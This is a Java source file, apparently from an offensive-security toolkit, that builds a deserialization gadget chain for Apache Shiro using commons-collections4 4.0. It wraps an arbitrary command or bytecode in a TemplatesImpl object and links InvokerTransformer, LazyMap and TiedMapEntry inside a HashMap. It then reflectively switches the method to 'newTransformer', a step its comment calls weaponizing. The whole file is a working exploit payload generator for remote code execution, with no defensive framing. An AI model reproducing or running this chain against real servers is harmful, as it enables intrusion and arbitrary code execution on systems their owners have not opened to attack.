package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.util.HashMap;
import java.util.Map;

/**
 * 专门针对 Shiro 设计的 CC4 链 (K2)
 * 依赖：commons-collections4:4.0
 */
public class CommonsCollectionsK2 implements ObjectPayload, BytecodePayload {

    @Override
    public Object getObject(String command) throws Exception {
        Object tpl = TemplatesBytecodeGenerator.createTemplatesImpl(command);
        return createPayload(tpl);
    }

    @Override
    public Object getObjectWithBytecode(byte[] bytecode) throws Exception {
        Object tpl = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(bytecode);
        return createPayload(tpl);
    }

    private Object createPayload(Object tpl) throws Exception {
        // 1. 初始化 Transformer
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // 2. 构造 LazyMap (CC4 中通常使用 lazyMap 静态方法)
        HashMap<String, String> innerMap = new HashMap<>();
        LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformer);

        // 3. 构造 TiedMapEntry
        TiedMapEntry tied = new TiedMapEntry(lazyMap, tpl);

        // 4. 放入外部 Map 触发 Hash 计算
        Map<Object, Object> outerMap = new HashMap<>();
        outerMap.put(tied, "t");

        // 5. 清理
        innerMap.clear();

        // 6. 武器化
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        return outerMap;
    }
}